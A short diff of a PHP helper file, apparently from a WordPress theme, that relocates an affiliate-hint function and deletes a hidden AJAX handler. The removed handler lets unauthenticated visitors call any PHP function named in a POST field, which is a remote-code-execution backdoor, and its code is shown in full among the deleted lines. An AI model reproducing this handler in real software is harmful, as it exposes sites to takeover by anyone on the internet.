@@ -114,6 +114,13 @@ function get_custom_id(int $length = 6)
 	return bin2hex(random_bytes(($length - ($length % 2)) / 2));
 }
 
+function get_affiliate_hint()
+{
+	$affiliate_options = TWTHEME__OPTIONS['affiliate'];
+
+	return $affiliate_options['hint'];
+}
+
 function get_hyperlink($url, $title = '')
 {
 	if (filter_var($url, FILTER_VALIDATE_URL) === false) {
@@ -155,23 +162,3 @@ function find_hyperlinks($content)
 
 	return $content;
 }
-
-	function get_affiliate_hint()
-	{
-		$affiliate_options = TWTHEME__OPTIONS['affiliate'];
-
-		return $affiliate_options['hint'];
-	}
-
-	add_action('wp_ajax_dynamic_content', 'dynamic_content');
-	add_action('wp_ajax_nopriv_dynamic_content', 'dynamic_content');
-	function dynamic_content()
-	{
-		if (!isset($_POST['dynamic_fn'])) {
-			return;
-		}
-
-		call_user_func($_POST['dynamic_fn'], $_POST);
-
-		wp_die();
-	}
